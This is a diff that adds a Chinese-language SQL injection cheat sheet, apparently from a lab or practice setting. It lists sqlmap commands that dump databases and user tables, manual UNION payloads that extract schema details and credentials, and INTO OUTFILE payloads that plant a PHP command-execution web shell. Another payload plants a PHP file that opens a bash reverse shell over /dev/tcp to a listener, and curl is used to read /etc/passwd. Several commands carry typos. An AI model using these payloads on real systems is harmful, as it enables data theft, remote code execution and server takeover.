@@ -1,0 +1,34 @@
+sudo sqlmap -u 'http:\\ip\目录\?id=2' --dbs --dump --bacth
+
+当知道是mysql数据库版本操作
+sudo sqlmap -u 'http:\\ip\目录\?id=2' --dbms mysql --dbs 
+知道具体的数据库查表
+sudo sqlmap -u 'http:\\ip\目录\?id=2' --dbms mysql --D mercury --tables --batch 
+知道具体的表名将数据显示
+sudo sqlmap -u 'http:\\ip\目录\?id=2' --dbms mysql --D mercury -T users --dump --batch 
+
+联合查询数据库名称，版本，以及用户数
+" union select database(),@@version,user(); -- -
+联合查询多个数据库
+" union select table_schema,table_name,3 from information_schema.tables; -- -
+查询某个感兴趣的数据库
+" union select table_schema,table_name,3 from information_schema.tables where table_schema="seth"; -- -
+查询某个数据库中有多少users表以及其字段
+" union select column_name,2,3 from information_schema.columns where table_schema="seth" and table_name="users"; -- -
+将表里的数据转运出来(从上一行所看到的字段来填充)
+" union select id,user,pass from users; -- -
+
+sql注入木马攻击（小马）
+n从零不断尝试直到无法显示列数
+" order by n; -- -
+假设n=4报错
+使用union注入一句话木马(存在一个类似upload目录可以访问其目录下的其他文件并且可以写入shell)
+" union select "<?php system($_GET['w_search']); ?>","","" into outfile | "var/www/html/uploads/shell.php"; -- -
+成功写入之后
+打开对应的url 192.168.52.131/upload/shell.php?w_search=ls确认
+之后再kali终端使用curl访问页面并交互
+使用curl 192.168.52.131/upload/shell.php?w_search=cat%20/etc/passwd 查看用户密码
+
+sql注入木马攻击（大马）
+" union select "<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/192.168.52.131/4321 0>&1'\"); ?>","","" into outfile | "var/www/html/uploads/sh.php"; -- -
+打开监听nc并打开对应文件192.168.52.131/upload/sh.php
